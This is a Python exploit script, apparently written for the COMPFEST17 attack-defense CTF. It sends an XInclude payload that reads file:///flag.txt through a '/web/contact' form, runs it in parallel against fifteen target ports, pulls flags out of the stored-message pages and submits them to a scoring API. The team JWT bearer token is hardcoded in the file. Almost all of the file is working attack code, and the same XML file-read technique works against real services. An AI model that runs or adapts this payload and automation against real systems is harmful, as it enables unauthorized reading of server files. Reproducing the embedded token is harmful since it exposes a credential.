#!/usr/bin/env python3
import os, re, sys, json, time, argparse
from typing import List, Set, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# -------------------------
# CONFIG
# -------------------------
API_HOST = "https://api.ctf-compfest.com"
SUBMIT_URL = f"{API_HOST.rstrip('/')}/api/v2/submit"

TEAM_JWT = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc1OTAyNDc1MiwianRpIjoiZDkyYzNmY2EtZGVkOS00MjM3LTk5OTctM2IzOWZiYzg1YzQwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ0ZWFtIjp7ImlkIjoxNywibmFtZSI6ImF5byBkYWZ0YXIgQVJLQVZJRElBIn19LCJuYmYiOjE3NTkwMjQ3NTIsImV4cCI6MTc1OTA2Nzk1Mn0.W-od2PiJjaeUsEGkWzG_lSFP1JXBZXpfHT2OFX_XlfOZttt5HKycV0Zorv2UprquOnma6wfEy3AhyMQTdn1OkQ"

TARGETS = [
    "10.0.38.15:40001",
    "10.0.38.15:40003",
    "10.0.38.15:40005",
    "10.0.38.15:40007",
    "10.0.38.15:40009",
    "10.0.38.15:40011",
    "10.0.38.15:40013",
    "10.0.38.15:40015",
    "10.0.38.15:40017",
    "10.0.38.15:40019",
    "10.0.38.15:40021",
    "10.0.38.15:40023",
    "10.0.38.15:40025",
    "10.0.38.15:40027",
    "10.0.38.15:40029",
]

# Web service paths (specific to this challenge)
UPLOAD_PATH = "/web/contact"  # POST form field "data" → XML with XInclude
VIEW_PATH_FMT = "/web/contact/{cid}"  # GET to view stored message

# Parallelism & timeouts
MAX_WORKERS = 12
HTTP_TIMEOUT = 15  # seconds per request

# Only accept COMPFEST flags
FLAG_RE = re.compile(r"COMPFEST17\{[^}]+\}")
# UUID shown on success page / link to view message
CID_RE = re.compile(
    r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
)

# XInclude payload (reads plaintext)
XINCLUDE_HREF = "file:///flag.txt"  # change if target uses a different path
XINCLUDE_PAYLOAD = (
    '<xi:include href="' + XINCLUDE_HREF + '" parse="text" '
    'xmlns:xi="http://www.w3.org/2001/XInclude"/>'
)


# -------------------------
# Helpers
# -------------------------
def base_url(host: str, port: int) -> str:
    return f"http://{host}:{port}"


def create_contact_and_get_cid(session: requests.Session, base: str) -> str:
    """
    POST the XInclude payload to /web/contact and return the contact id (UUID).
    """
    url = base + UPLOAD_PATH
    try:
        r = session.post(url, data={"data": XINCLUDE_PAYLOAD}, timeout=HTTP_TIMEOUT)
    except Exception as e:
        print(f"[!] {base} POST error: {e}", file=sys.stderr)
        return ""

    if r.status_code != 200:
        print(f"[!] {base} POST HTTP {r.status_code}: {r.text[:200]}", file=sys.stderr)
        return ""

    body = r.text
    # Prefer link pattern: href="/web/contact/<uuid>"
    m = re.search(r'href="/web/contact/(' + CID_RE.pattern + r')"', body)
    if m:
        return m.group(1)
    # Fallback: any UUID on the page
    m2 = CID_RE.search(body)
    if m2:
        return m2.group(0)

    print(f"[!] {base} no contact id found in response", file=sys.stderr)
    return ""


def fetch_contact_and_extract_flags(
    session: requests.Session, base: str, cid: str
) -> List[str]:
    """
    GET /web/contact/<cid> and return all COMPFEST flags found in response body.
    """
    url = base + VIEW_PATH_FMT.format(cid=cid)
    try:
        r = session.get(url, timeout=HTTP_TIMEOUT)
    except Exception as e:
        print(f"[!] {base} GET error for cid={cid}: {e}", file=sys.stderr)
        return []

    if r.status_code != 200:
        print(
            f"[!] {base} GET HTTP {r.status_code} for cid={cid}: {r.text[:200]}",
            file=sys.stderr,
        )
        return []

    seen: Set[str] = set()
    out: List[str] = []
    for m in FLAG_RE.finditer(r.text):
        flag = m.group(0)
        if flag not in seen:
            seen.add(flag)
            out.append(flag)
    return out


def run_once(host: str, port: int) -> Tuple[str, List[str]]:
    """
    Create a message via XInclude → retrieve message → extract flags.
    """
    target = f"{host}:{port}"
    base = base_url(host, port)
    sess = requests.Session()

    cid = create_contact_and_get_cid(sess, base)
    if not cid:
        return target, []

    flags = fetch_contact_and_extract_flags(sess, base, cid)
    return target, flags


def submit_flags(flags: List[str], jwt: str) -> Dict[str, str]:
    """
    Submit list of flags. Returns {flag: verdict}. Handles 429 with backoff.
    """
    if not flags:
        return {}
    headers = {"Authorization": f"Bearer {jwt}"}
    payload = {"flags": flags}

    backoff = 1.0
    for _ in range(5):
        try:
            resp = requests.post(SUBMIT_URL, json=payload, headers=headers, timeout=15)
        except Exception as e:
            print(f"[!] submit error: {e}", file=sys.stderr)
            time.sleep(backoff)
            backoff = min(backoff * 2, 60.0)
            continue

        if resp.status_code == 200:
            out: Dict[str, str] = {}
            try:
                data = resp.json().get("data", [])
                for item in data:
                    flag = item.get("flag")
                    verdict = item.get("verdict")
                    if flag:
                        out[flag] = verdict or ""
            except Exception:
                print(f"[!] bad JSON in submit 200: {resp.text[:400]}", file=sys.stderr)
            return out

        if resp.status_code == 429:
            print("[!] submit 429 rate-limited; backing off...", file=sys.stderr)
            time.sleep(backoff)
            backoff = min(backoff * 2, 60.0)
            continue

        print(
            f"[!] submit {resp.status_code}: {resp.text.strip()[:400]}", file=sys.stderr
        )
        return {}
    return {}


# -------------------------
# MAIN
# -------------------------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--jwt", default=TEAM_JWT)
    ap.add_argument("--targets", nargs="*", default=TARGETS)
    ap.add_argument("--workers", type=int, default=MAX_WORKERS)
    args = ap.parse_args()

    if not args.targets:
        print(
            "[!] no targets configured. Edit TARGETS or pass --targets", file=sys.stderr
        )
        return
    if not args.jwt or args.jwt.startswith("REPLACE_"):
        print(
            "[!] TEAM_JWT missing. Provide a valid JWT via --jwt or in the file.",
            file=sys.stderr,
        )
        return

    print(f"[*] attacking {len(args.targets)} targets with {args.workers} workers")
    all_flags: List[str] = []
    seen: Set[str] = set()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = []
        for t in args.targets:
            try:
                host, port_s = t.split(":")
                port = int(port_s)
            except Exception:
                print(
                    f"[!] bad target format (expected host:port): {t}", file=sys.stderr
                )
                continue
            futs.append(ex.submit(run_once, host, port))

        for fut in as_completed(futs):
            target, flags = fut.result()
            if flags:
                print(f"[+] {target}: {len(flags)} flag(s)")
            for f in flags:
                if f not in seen:
                    seen.add(f)
                    all_flags.append(f)

    if not all_flags:
        print("[*] no flags found")
        return

    print(f"[*] submitting {len(all_flags)} unique flag(s)")
    verdicts = submit_flags(all_flags, args.jwt)
    if not verdicts:
        print("[!] submit returned no results (see stderr for details)")
        return

    for f in all_flags:
        print(f"{f} -> {verdicts.get(f, 'no verdict')}")


if __name__ == "__main__":
    main()
